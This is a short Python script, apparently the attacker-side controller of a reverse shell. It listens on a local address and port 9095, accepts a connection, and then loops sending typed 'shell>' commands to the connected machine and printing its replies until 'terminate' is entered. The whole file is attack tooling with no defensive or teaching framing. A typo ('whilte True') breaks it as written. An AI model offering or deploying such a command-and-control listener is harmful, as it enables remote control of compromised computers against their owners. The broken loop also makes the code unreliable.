import socket


def connect():
    s = socket.socket()
    s.bind(("192.168.0.152",9095))
    s.listen(1)
    conn, addr = s.accept()
    print ('[+] we got a connection from ', addr)
    
    whilte True:
        command = input("shell> ")
        if "terminate" in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())


def main():
    connect()
main()
